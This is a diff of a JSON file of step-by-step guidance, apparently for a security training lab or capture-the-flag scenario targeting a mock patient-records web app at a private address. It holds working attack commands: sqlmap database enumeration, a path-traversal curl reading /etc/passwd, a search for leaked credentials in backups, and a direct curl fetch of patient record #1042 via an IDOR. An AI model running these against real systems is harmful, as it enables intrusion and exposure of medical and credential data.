@@ -53,7 +53,7 @@
           "Step 2: SQLi enumeration after proof: `sqlmap -u 'http://172.20.1.20/login' --data='username=admin&password=test' --level=2 --risk=1 --dbs`.",
           "Step 3: LFI proof: `curl 'http://172.20.1.20/records?file=../../../../etc/passwd'`. If you see `root:x:0:0`, submit the LFI flag and document the request.",
           "Step 4: Backup review: curl or browse discovered backup paths and look for training credentials or configuration leaks.",
-          "Step 5: IDOR proof: try patient record IDs around the one you can access, especially the scenario target record #1042. Document only the minimum data needed to prove impact."
+          "Step 5: IDOR proof: curl 'http://172.20.1.20/api/v1/patients/1042' to fetch patient record #1042 and document only the minimum data needed to prove impact."
         ]
       },
       "4": {
